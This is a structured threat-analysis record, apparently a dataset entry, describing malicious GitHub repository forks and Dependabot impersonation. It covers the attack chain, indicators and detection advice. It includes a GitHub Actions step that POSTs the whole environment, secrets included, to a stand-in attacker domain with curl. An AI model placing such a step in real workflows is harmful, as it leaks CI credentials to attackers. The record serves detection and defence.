package_info.package_name: Malicious GitHub Repo Forks / Dependabot Impersonation
package_info.package_manager: GitHub (source code repositories, not a traditional package manager)
package_info.why_malicious: Attackers clone legitimate repositories, inject malware loaders or credential-stealing code, and re-upload them under identical names with fake forks to increase legitimacy. In some cases, attackers use stolen GitHub tokens to impersonate trusted bots (e.g., Dependabot) and commit malicious code, aiming to exfiltrate sensitive data or inject further malware.

malicious_snippets.code_behavior: At commit-time, the code accesses environment variables and sensitive data, then exfiltrates this information via HTTPS POST to an attacker-controlled domain, enabling credential and secret theft.

malice_analysis.why_suspicious: The code exfiltrates environment variables and sensitive data to an external domain, which is a classic sign of credential theft.
malice_analysis.violated_expectations: Normal repository code should not access CI/CD secrets or environment variables and send them to external servers.
malice_analysis.similar_legitimate_use: Telemetry or error reporting libraries may send non-sensitive data to trusted domains.
key_indicators: Access to process.env or secret files

execution_context.trigger: CI/CD pipeline (GitHub Actions triggered by PR/commit)

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate secrets
    run: |
      curl -X POST -d "$(env)" https://malicious-domain.com/ci-secrets
malicious_snippets.code_behavior: During CI/CD execution, the workflow script collects all environment variables (including secrets) and exfiltrates them via HTTP POST to an attacker-controlled domain.

malice_analysis.why_suspicious: CI/CD workflows should not send environment variables to external, untrusted domains.
malice_analysis.violated_expectations: Legitimate workflows may use secrets for deployment, but should never exfiltrate them.
malice_analysis.similar_legitimate_use: Sending build status to trusted internal endpoints.
key_indicators: curl/wget to external domains in workflow scripts

attack_chain.action: Attacker clones legitimate repositories and injects malicious code or workflows.
attack_chain.leads_to: Malicious code is committed and uploaded to GitHub under the same or similar names.

attack_chain.action: Attacker creates thousands of fake forks to increase legitimacy and visibility.
attack_chain.leads_to: Victims are more likely to trust and use the infected repositories.

attack_chain.action: Victims use or integrate the infected repositories, triggering the malicious code or workflows.
attack_chain.leads_to: Sensitive data is exfiltrated to attacker-controlled infrastructure.

behavioral_signatures: Repository code or workflows accessing environment variables and sending them to external domains
Unusual network requests in CI/CD pipelines
Large-scale forking and identical repository names with minor code changes
file_indicators: JavaScript files with fetch/curl/wget to untrusted domains
Sudden appearance of new workflow files in trusted repos
network_indicators: Outbound HTTP/HTTPS requests to domains not associated with the project
POST requests containing environment variable dumps
Connections to known malicious exfiltration endpoints
detection_knowledge.how_to_detect: Monitor for new or modified workflow files and code that access secrets or environment variables and send data to external domains. Flag repositories with sudden, large-scale forking or identical naming patterns. Use network monitoring to detect outbound requests to untrusted or known malicious domains from CI/CD environments.
